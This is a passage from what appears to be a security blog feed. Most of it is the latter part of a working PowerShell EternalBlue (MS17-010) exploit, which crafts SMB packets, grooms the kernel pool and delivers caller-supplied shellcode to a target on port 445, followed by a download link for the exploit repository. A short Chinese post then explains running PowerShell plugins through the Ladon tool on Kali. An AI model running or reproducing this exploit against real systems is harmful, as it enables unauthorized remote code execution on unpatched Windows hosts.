class="comment"># PID</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>x00               <span class="comment"># Reserved</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>x00               <span class="comment"># UserID</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x40,<span class="number">0</span>x00               <span class="comment"># MultiplexID</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x0d                   <span class="comment"># Word Count</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>xff                   <span class="comment"># No further commands</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x00                   <span class="comment"># Reserved</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x88,<span class="number">0</span>x00               <span class="comment"># AndXOffset</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x04,<span class="number">0</span>x11               <span class="comment"># Max Buffer</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x0a,<span class="number">0</span>x00               <span class="comment"># Max Mpx Count</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>x00               <span class="comment"># VC Number</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00       <span class="comment"># Session key</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x01,<span class="number">0</span>x00               <span class="comment"># ANSI pw length</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>x00               <span class="comment"># Unicode pw length</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00       <span class="comment"># Reserved</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>xd4,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00       <span class="comment"># Capabilities</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x4b,<span class="number">0</span>x00               <span class="comment"># Byte count</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x00                   <span class="comment"># ANSI pw</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>x00               <span class="comment"># Account name</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>x00               <span class="comment"># Domain name</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Windows 2000 2195</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x57,<span class="number">0</span>x00,<span class="number">0</span>x69,<span class="number">0</span>x00,<span class="number">0</span>x6e,<span class="number">0</span>x00,<span class="number">0</span>x64,<span class="number">0</span>x00,<span class="number">0</span>x6f,<span class="number">0</span>x00,<span class="number">0</span>x77,<span class="number">0</span>x00,<span class="number">0</span>x73,<span class="number">0</span>x00,<span class="number">0</span>x20,<span class="number">0</span>x00,<span class="number">0</span>x32</span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>x30,<span class="number">0</span>x00,<span class="number">0</span>x30,<span class="number">0</span>x00,<span class="number">0</span>x30,<span class="number">0</span>x00,<span class="number">0</span>x20,<span class="number">0</span>x00,<span class="number">0</span>x32,<span class="number">0</span>x00,<span class="number">0</span>x31,<span class="number">0</span>x00,<span class="number">0</span>x39,<span class="number">0</span>x00,<span class="number">0</span>x35,<span class="number">0</span>x00</span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>x00</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Windows 2000 5.0</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x57,<span class="number">0</span>x00,<span class="number">0</span>x69,<span class="number">0</span>x00,<span class="number">0</span>x6e,<span class="number">0</span>x00,<span class="number">0</span>x64,<span class="number">0</span>x00,<span class="number">0</span>x6f,<span class="number">0</span>x00,<span class="number">0</span>x77,<span class="number">0</span>x00,<span class="number">0</span>x73,<span class="number">0</span>x00,<span class="number">0</span>x20,<span class="number">0</span>x00,<span class="number">0</span>x32</span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>x30,<span class="number">0</span>x00,<span class="number">0</span>x30,<span class="number">0</span>x00,<span class="number">0</span>x30,<span class="number">0</span>x00,<span class="number">0</span>x20,<span class="number">0</span>x00,<span class="number">0</span>x35,<span class="number">0</span>x00,<span class="number">0</span>x2e,<span class="number">0</span>x00,<span class="number">0</span>x30,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$pkt</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tree_connect_andx_request</span><span class="params">(<span class="variable">$Target</span>, <span class="variable">$userid</span>)</span></span> &#123;</span><br><span class="line"></span><br><span class="line">     [<span class="built_in">Byte</span>[]] <span class="variable">$pkt</span> = [<span class="built_in">Byte</span>[]](<span class="number">0</span>x00)              <span class="comment">#$pkt +=Message_Type'</span></span><br><span class="line">     <span class="variable">$pkt</span> +=<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x47       <span class="comment">#$pkt +=Length'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">     <span class="variable">$pkt</span> +=<span class="number">0</span>xFF,<span class="number">0</span>x53,<span class="number">0</span>x4D,<span class="number">0</span>x42  <span class="comment">#$pkt +=server_component': .SMB</span></span><br><span class="line">     <span class="variable">$pkt</span> +=<span class="number">0</span>x75              <span class="comment">#$pkt +=smb_command': Tree Connect AndX</span></span><br><span class="line">     <span class="variable">$pkt</span> +=<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00  <span class="comment">#$pkt +=nt_status'</span></span><br><span class="line">     <span class="variable">$pkt</span> +=<span class="number">0</span>x18              <span class="comment">#$pkt +=flags'</span></span><br><span class="line">     <span class="variable">$pkt</span> +=<span class="number">0</span>x01,<span class="number">0</span>x20          <span class="comment">#$pkt +=flags2'</span></span><br><span class="line">     <span class="variable">$pkt</span> +=<span class="number">0</span>x00,<span class="number">0</span>x00          <span class="comment">#$pkt +=process_id_high'</span></span><br><span class="line">     <span class="variable">$pkt</span> +=<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00  <span class="comment">#$pkt +=signature'</span></span><br><span class="line">     <span class="variable">$pkt</span> +=<span class="number">0</span>x00,<span class="number">0</span>x00          <span class="comment">#$pkt +=reserved'</span></span><br><span class="line">     <span class="variable">$pkt</span> +=<span class="number">0</span>x00,<span class="number">0</span>x00          <span class="comment">#$pkt +=tree_id'</span></span><br><span class="line">     <span class="variable">$pkt</span> +=<span class="number">0</span>x2F,<span class="number">0</span>x4B          <span class="comment">#$pkt +=process_id'</span></span><br><span class="line">     <span class="variable">$pkt</span> += <span class="variable">$userid</span>              <span class="comment">#$pkt +=user_id'</span></span><br><span class="line">     <span class="variable">$pkt</span> +=<span class="number">0</span>xC5,<span class="number">0</span>x5E           <span class="comment">#$pkt +=multiplex_id'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$ipc</span> = <span class="string">"\\"</span>+ <span class="variable">$Target</span> + <span class="string">"\IPC<span class="variable">$</span>"</span></span><br><span class="line"></span><br><span class="line">     <span class="variable">$pkt</span> +=<span class="number">0</span>x04              <span class="comment"># Word Count</span></span><br><span class="line">     <span class="variable">$pkt</span> +=<span class="number">0</span>xFF              <span class="comment"># AndXCommand: No further commands</span></span><br><span class="line">     <span class="variable">$pkt</span> +=<span class="number">0</span>x00              <span class="comment"># Reserved</span></span><br><span class="line">     <span class="variable">$pkt</span> +=<span class="number">0</span>x00,<span class="number">0</span>x00          <span class="comment"># AndXOffset</span></span><br><span class="line">     <span class="variable">$pkt</span> +=<span class="number">0</span>x00,<span class="number">0</span>x00          <span class="comment"># Flags</span></span><br><span class="line">     <span class="variable">$pkt</span> +=<span class="number">0</span>x01,<span class="number">0</span>x00          <span class="comment"># Password Length</span></span><br><span class="line">     <span class="variable">$pkt</span> +=<span class="number">0</span>x1A,<span class="number">0</span>x00          <span class="comment"># Byte Count</span></span><br><span class="line">     <span class="variable">$pkt</span> +=<span class="number">0</span>x00              <span class="comment"># Password</span></span><br><span class="line">     <span class="variable">$pkt</span> += [<span class="type">system.Text.Encoding</span>]::ASCII.GetBytes(<span class="variable">$ipc</span>) <span class="comment"># \,0xxx.xxx.xxx.xxx\IPC$</span></span><br><span class="line">     <span class="variable">$pkt</span> += <span class="number">0</span>x00       <span class="comment"># null byte after ipc added by kev</span></span><br><span class="line"></span><br><span class="line">     <span class="variable">$pkt</span> += <span class="number">0</span>x3f,<span class="number">0</span>x3f,<span class="number">0</span>x3f,<span class="number">0</span>x3f,<span class="number">0</span>x3f,<span class="number">0</span>x00   <span class="comment"># Service</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$len</span> = <span class="variable">$pkt</span>.Length - <span class="number">4</span></span><br><span class="line">    <span class="comment"># netbios[1] =$pkt +=0x00' + struct.pack('&gt;H length)</span></span><br><span class="line">    <span class="variable">$hexlen</span> = [<span class="type">bitconverter</span>]::GetBytes(<span class="variable">$len</span>)[-<span class="number">2</span><span class="type">..</span>-<span class="number">4</span>]</span><br><span class="line">    <span class="variable">$pkt</span>[<span class="number">1</span>] = <span class="variable">$hexlen</span>[<span class="number">0</span>]</span><br><span class="line">    <span class="variable">$pkt</span>[<span class="number">2</span>] = <span class="variable">$hexlen</span>[<span class="number">1</span>]</span><br><span class="line">    <span class="variable">$pkt</span>[<span class="number">3</span>] = <span class="variable">$hexlen</span>[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$pkt</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">smb_header</span><span class="params">(<span class="variable">$smbheader</span>)</span></span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$parsed_header</span> =<span class="selector-tag">@</span>&#123;server_component=<span class="variable">$smbheader</span>[<span class="number">0</span><span class="type">..3</span>];</span><br><span class="line">                  smb_command=<span class="variable">$smbheader</span>[<span class="number">4</span>];</span><br><span class="line">                  error_class=<span class="variable">$smbheader</span>[<span class="number">5</span>];</span><br><span class="line">                  reserved1=<span class="variable">$smbheader</span>[<span class="number">6</span>];</span><br><span class="line">                  error_code=<span class="variable">$smbheader</span>[<span class="number">6</span><span class="type">..7</span>];</span><br><span class="line">                  flags=<span class="variable">$smbheader</span>[<span class="number">8</span>];</span><br><span class="line">                  flags2=<span class="variable">$smbheader</span>[<span class="number">9</span><span class="type">..10</span>];</span><br><span class="line">                  process_id_high=<span class="variable">$smbheader</span>[<span class="number">11</span><span class="type">..12</span>];</span><br><span class="line">                  signature=<span class="variable">$smbheader</span>[<span class="number">13</span><span class="type">..21</span>];</span><br><span class="line">                  reserved2=<span class="variable">$smbheader</span>[<span class="number">22</span><span class="type">..23</span>];</span><br><span class="line">                  tree_id=<span class="variable">$smbheader</span>[<span class="number">24</span><span class="type">..25</span>];</span><br><span class="line">                  process_id=<span class="variable">$smbheader</span>[<span class="number">26</span><span class="type">..27</span>];</span><br><span class="line">                  user_id=<span class="variable">$smbheader</span>[<span class="number">28</span><span class="type">..29</span>];</span><br><span class="line">                  multiplex_id=<span class="variable">$smbheader</span>[<span class="number">30</span><span class="type">..31</span>];</span><br><span class="line">                 &#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$parsed_header</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">smb1_get_response</span><span class="params">(<span class="variable">$sock</span>)</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$tcp_response</span> = [<span class="built_in">Array</span>]::CreateInstance(<span class="string">"byte"</span>, <span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="variable">$sock</span>.Receive(<span class="variable">$tcp_response</span>)| <span class="built_in">out-null</span></span><br><span class="line"></span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">catch</span> &#123;</span><br><span class="line">      <span class="built_in">Write-Verbose</span> <span class="string">"socket error, exploit may fail "</span></span><br><span class="line">     &#125;</span><br><span class="line">    <span class="variable">$netbios</span> = <span class="variable">$tcp_response</span>[<span class="number">0</span><span class="type">..4</span>]</span><br><span class="line">    <span class="variable">$smb_header</span> = <span class="variable">$tcp_response</span>[<span class="number">4</span><span class="type">..36</span>]  <span class="comment"># SMB Header: 32 bytes</span></span><br><span class="line">    <span class="variable">$parsed_header</span> = smb_header(<span class="variable">$smb_header</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$tcp_response</span>, <span class="variable">$parsed_header</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">client_negotiate</span><span class="params">(<span class="variable">$sock</span>)</span></span>&#123;</span><br><span class="line"><span class="variable">$raw_proto</span> = negotiate_proto_request</span><br><span class="line">    <span class="variable">$sock</span>.Send(<span class="variable">$raw_proto</span>) | <span class="built_in">out-null</span></span><br><span class="line">    <span class="keyword">return</span> smb1_get_response(<span class="variable">$sock</span>)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">smb1_anonymous_login</span><span class="params">(<span class="variable">$sock</span>)</span></span>&#123;</span><br><span class="line">    <span class="variable">$raw_proto</span> = make_smb1_anonymous_login_packet</span><br><span class="line">    <span class="variable">$sock</span>.Send(<span class="variable">$raw_proto</span>) | <span class="built_in">out-null</span></span><br><span class="line">   <span class="keyword">return</span> smb1_get_response(<span class="variable">$sock</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tree_connect_andx</span><span class="params">(<span class="variable">$sock</span>, <span class="variable">$Target</span>, <span class="variable">$userid</span>)</span></span>&#123;</span><br><span class="line">    <span class="variable">$raw_proto</span> = tree_connect_andx_request <span class="variable">$Target</span> <span class="variable">$userid</span></span><br><span class="line">    <span class="variable">$sock</span>.Send(<span class="variable">$raw_proto</span>) | <span class="built_in">out-null</span></span><br><span class="line">   <span class="keyword">return</span> smb1_get_response(<span class="variable">$sock</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">smb1_anonymous_connect_ipc</span><span class="params">(<span class="variable">$Target</span>)</span></span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$client</span> = <span class="built_in">New-Object</span> System.Net.Sockets.TcpClient(<span class="variable">$Target</span>,<span class="number">445</span>)</span><br><span class="line"></span><br><span class="line">    <span class="variable">$sock</span> = <span class="variable">$client</span>.Client</span><br><span class="line">    client_negotiate(<span class="variable">$sock</span>) | <span class="built_in">Out-Null</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$raw</span>, <span class="variable">$smbheader</span> = smb1_anonymous_login <span class="variable">$sock</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$raw</span>, <span class="variable">$smbheader</span> = tree_connect_andx <span class="variable">$sock</span> <span class="variable">$Target</span> <span class="variable">$smbheader</span>.user_id</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$smbheader</span>, <span class="variable">$sock</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">smb1_large_buffer</span><span class="params">(<span class="variable">$smbheader</span>,<span class="variable">$sock</span>)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$nt_trans_pkt</span> = make_smb1_nt_trans_packet <span class="variable">$smbheader</span>.tree_id <span class="variable">$smbheader</span>.user_id</span><br><span class="line"></span><br><span class="line">    <span class="comment"># send NT Trans</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$sock</span>.Send(<span class="variable">$nt_trans_pkt</span>) | <span class="built_in">out-null</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$raw</span>, <span class="variable">$transheader</span> = smb1_get_response(<span class="variable">$sock</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#initial trans2 request</span></span><br><span class="line">    <span class="variable">$trans2_pkt_nulled</span> = make_smb1_trans2_exploit_packet <span class="variable">$smbheader</span>.tree_id <span class="variable">$smbheader</span>.user_id <span class="string">"eb_trans2_zero"</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#send all but the last packet</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> =<span class="number">1</span>; <span class="variable">$i</span> <span class="operator">-le</span> <span class="number">14</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$trans2_pkt_nulled</span> += make_smb1_trans2_exploit_packet <span class="variable">$smbheader</span>.tree_id <span class="variable">$smbheader</span>.user_id <span class="string">"eb_trans2_buffer"</span> <span class="variable">$i</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$trans2_pkt_nulled</span> += make_smb1_echo_packet <span class="variable">$smbheader</span>.tree_id  <span class="variable">$smbheader</span>.user_id</span><br><span class="line">    <span class="variable">$sock</span>.Send(<span class="variable">$trans2_pkt_nulled</span>) | <span class="built_in">out-null</span></span><br><span class="line"></span><br><span class="line">    smb1_get_response(<span class="variable">$sock</span>) | <span class="built_in">Out-Null</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">smb1_free_hole</span><span class="params">(<span class="variable">$start</span>)</span></span> &#123;</span><br><span class="line">   <span class="variable">$client</span> = <span class="built_in">New-Object</span> System.Net.Sockets.TcpClient(<span class="variable">$Target</span>,<span class="number">445</span>)</span><br><span class="line"></span><br><span class="line">    <span class="variable">$sock</span> = <span class="variable">$client</span>.Client</span><br><span class="line">    client_negotiate(<span class="variable">$sock</span>) | <span class="built_in">Out-Null</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$start</span>) &#123;</span><br><span class="line">        <span class="variable">$pkt</span> =  make_smb1_free_hole_session_packet (<span class="number">0</span>x07,<span class="number">0</span>xc0) (<span class="number">0</span>x2d,<span class="number">0</span>x01) (<span class="number">0</span>xf0,<span class="number">0</span>xff,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$pkt</span> =  make_smb1_free_hole_session_packet (<span class="number">0</span>x07,<span class="number">0</span>x40) (<span class="number">0</span>x2c,<span class="number">0</span>x01) (<span class="number">0</span>xf8,<span class="number">0</span>x87,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$sock</span>.Send(<span class="variable">$pkt</span>) | <span class="built_in">out-null</span></span><br><span class="line">    smb1_get_response(<span class="variable">$sock</span>) | <span class="built_in">Out-Null</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$sock</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">smb2_grooms</span><span class="params">(<span class="variable">$Target</span>, <span class="variable">$grooms</span>, <span class="variable">$payload_hdr_pkt</span>, <span class="variable">$groom_socks</span>)</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">         <span class="keyword">for</span>(<span class="variable">$i</span> =<span class="number">0</span>; <span class="variable">$i</span> <span class="operator">-lt</span> <span class="variable">$grooms</span>; <span class="variable">$i</span>++)</span><br><span class="line">         &#123;</span><br><span class="line">            <span class="variable">$client</span> = <span class="built_in">New-Object</span> System.Net.Sockets.TcpClient(<span class="variable">$Target</span>,<span class="number">445</span>)</span><br><span class="line"></span><br><span class="line">             <span class="variable">$gsock</span> = <span class="variable">$client</span>.Client</span><br><span class="line">             <span class="variable">$groom_socks</span> += <span class="variable">$gsock</span></span><br><span class="line">             <span class="variable">$gsock</span>.Send(<span class="variable">$payload_hdr_pkt</span>) | <span class="built_in">out-null</span></span><br><span class="line"></span><br><span class="line">         &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$groom_socks</span></span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">smb_eternalblue</span><span class="params">(<span class="variable">$Target</span>, <span class="variable">$grooms</span>, <span class="variable">$Shellcode</span>)</span></span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">#replace null bytes with your shellcode</span></span><br><span class="line">    [<span class="built_in">Byte</span>[]]  <span class="variable">$payload</span> = [<span class="built_in">Byte</span>[]](<span class="variable">$Shellcode</span>)</span><br><span class="line"></span><br><span class="line">    <span class="variable">$shellcode</span> = make_kernel_user_payload(<span class="variable">$payload</span>)</span><br><span class="line">    <span class="variable">$payload_hdr_pkt</span> = make_smb2_payload_headers_packet</span><br><span class="line">    <span class="variable">$payload_body_pkt</span> = make_smb2_payload_body_packet(<span class="variable">$shellcode</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Write-Verbose</span> <span class="string">"Connecting to target for activities"</span></span><br><span class="line">     <span class="variable">$smbheader</span>, <span class="variable">$sock</span> = smb1_anonymous_connect_ipc(<span class="variable">$Target</span>)</span><br><span class="line">     <span class="variable">$sock</span>.ReceiveTimeout =<span class="number">2000</span></span><br><span class="line">     <span class="built_in">Write-Verbose</span> <span class="string">"Connection established for exploitation."</span></span><br><span class="line">           <span class="comment"># Step 2: Create a large SMB1 buffer</span></span><br><span class="line">           <span class="built_in">Write-Verbose</span>  <span class="string">"all but last fragment of exploit packet"</span></span><br><span class="line">     smb1_large_buffer <span class="variable">$smbheader</span> <span class="variable">$sock</span></span><br><span class="line">           <span class="comment"># Step 3: Groom the pool with payload packets, and open/close SMB1 packets</span></span><br><span class="line"></span><br><span class="line">     <span class="comment"># initialize_groom_threads(ip, port, payload, grooms)</span></span><br><span class="line">     <span class="variable">$fhs_sock</span> = smb1_free_hole <span class="variable">$true</span></span><br><span class="line">     <span class="variable">$groom_socks</span> =<span class="selector-tag">@</span>()</span><br><span class="line">     <span class="variable">$groom_socks</span> = smb2_grooms <span class="variable">$Target</span> <span class="variable">$grooms</span> <span class="variable">$payload_hdr_pkt</span> <span class="variable">$groom_socks</span></span><br><span class="line"></span><br><span class="line">     <span class="variable">$fhf_sock</span> = smb1_free_hole <span class="variable">$false</span></span><br><span class="line"></span><br><span class="line">     <span class="variable">$fhs_sock</span>.Close() | <span class="built_in">Out-Null</span></span><br><span class="line"></span><br><span class="line">     <span class="variable">$groom_socks</span> = smb2_grooms <span class="variable">$Target</span> <span class="number">6</span> <span class="variable">$payload_hdr_pkt</span> <span class="variable">$groom_socks</span></span><br><span class="line"></span><br><span class="line">     <span class="variable">$fhf_sock</span>.Close() | <span class="built_in">out-null</span></span><br><span class="line"></span><br><span class="line">     <span class="built_in">Write-Verbose</span> <span class="string">"Running final exploit packet"</span></span><br><span class="line"></span><br><span class="line">     <span class="variable">$final_exploit_pkt</span> =  <span class="variable">$trans2_pkt_nulled</span> = make_smb1_trans2_exploit_packet <span class="variable">$smbheader</span>.tree_id <span class="variable">$smbheader</span>.user_id <span class="string">"eb_trans2_exploit"</span>  <span class="number">15</span></span><br><span class="line"></span><br><span class="line">     <span class="keyword">try</span>&#123;</span><br><span class="line">     <span class="variable">$sock</span>.Send(<span class="variable">$final_exploit_pkt</span>) | <span class="built_in">Out-Null</span></span><br><span class="line">      <span class="variable">$raw</span>, <span class="variable">$exploit_smb_header</span> = smb1_get_response <span class="variable">$sock</span></span><br><span class="line">      <span class="built_in">Write-Verbose</span> (<span class="string">"SMB code: "</span> + [<span class="type">System.BitConverter</span>]::ToString(<span class="variable">$exploit_smb_header</span>.error_code))</span><br><span class="line"></span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">catch</span> &#123;</span><br><span class="line">      <span class="built_in">Write-Verbose</span> <span class="string">"socket error, exploit may fail horribly"</span></span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      <span class="built_in">Write-Verbose</span> <span class="string">"Send the payload with the grooms"</span></span><br><span class="line"></span><br><span class="line">     <span class="keyword">foreach</span> (<span class="variable">$gsock</span> <span class="keyword">in</span> <span class="variable">$groom_socks</span>)</span><br><span class="line">     &#123;</span><br><span class="line">        <span class="variable">$gsock</span>.Send(<span class="variable">$payload_body_pkt</span>[<span class="number">0</span><span class="type">..2919</span>]) | <span class="built_in">out-null</span></span><br><span class="line">     &#125;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$gsock</span> <span class="keyword">in</span> <span class="variable">$groom_socks</span>)</span><br><span class="line">     &#123;</span><br><span class="line">        <span class="variable">$gsock</span>.Send(<span class="variable">$payload_body_pkt</span>[<span class="number">2920</span><span class="type">..4072</span>]) | <span class="built_in">out-null</span></span><br><span class="line">     &#125;</span><br><span class="line">         <span class="keyword">foreach</span> (<span class="variable">$gsock</span> <span class="keyword">in</span> <span class="variable">$groom_socks</span>)</span><br><span class="line">     &#123;</span><br><span class="line">        <span class="variable">$gsock</span>.Close() | <span class="built_in">out-null</span></span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="variable">$sock</span>.Close()| <span class="built_in">out-null</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$VerbosePreference</span> = <span class="string">"continue"</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> <span class="operator">-lt</span> <span class="variable">$MaxAttempts</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$grooms</span> = <span class="variable">$InitialGrooms</span> + <span class="variable">$GROOM_DELTA</span>*<span class="variable">$i</span></span><br><span class="line">    smb_eternalblue <span class="variable">$Target</span> <span class="variable">$grooms</span> <span class="variable">$Shellcode</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Download"><a href="#Download" class="headerlink" title="Download"></a>Download</h3><p><a href="https://github.com/k8gege/MS17010EXP" target="_blank" rel="noopener">https://github.com/k8gege/MS17010EXP</a></p>
]]></content>
      <categories>
        <category>Exp</category>
        <category>Ladon</category>
      </categories>
      <tags>
        <tag>Exp</tag>
        <tag>Rce</tag>
        <tag>MS17010</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali 2019 &amp; Ladon无PowerShell执行脚本</title>
    <url>/p/32e1a912.html</url>
    <content><![CDATA[<h3 id="关于Kali-amp-PowerShell"><a href="#关于Kali-amp-PowerShell" class="headerlink" title="关于Kali &amp; PowerShell"></a>关于Kali &amp; PowerShell</h3><p>最近Kali出了年度最终版2019.4，该版本主存储库集成了PowerShell，可apt一键安装。<br>实际上想用PowerShell也不是非要等2019.4版本，和很多程序一样，可以自己下载安装。<br>因为微软PowerShell早在几年前就支持跨平台了还有.net程序，听说mono被微软收购了。<br>只是多打几条命令而已，不是说之前版本的Kali就不支持PowerShell，真佩服国内小编。<br>当然也可以在不安装PowerShell的环境下通过Ladon来执行PowerShell脚本。</p>
<h3 id="PowerShell例子"><a href="#PowerShell例子" class="headerlink" title="PowerShell例子"></a>PowerShell例子</h3><p>以下代码为Ladon插件例子，非常简单只需一个函数Ladon以及返回结果即可。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function Ladon ()&#123;</span><br><span class="line">param([string]$ip) </span><br><span class="line">#write-output $ip</span><br><span class="line">$result&#x3D;-Join(&quot;PsDemo &quot;,$ip)</span><br><span class="line">return $result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Ladon下载"><a href="#Ladon下载" class="headerlink" title="Ladon下载"></a>Ladon下载</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://github.com/k8gege/Ladon/raw/master/KaliLadon -O Ladon</span><br></pre></td></tr></table></figure>

<h3 id="安装mono运行库"><a href="#安装mono运行库" class="headerlink" title="安装mono运行库"></a>安装mono运行库</h3><p>Linux版Ladon需mono,类似jar需java，py需python环境等<br>mono执行兼容性、稳定性以及效率在Linux下不如Win系统</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install mono-runtime</span><br></pre></td></tr></table></figure>

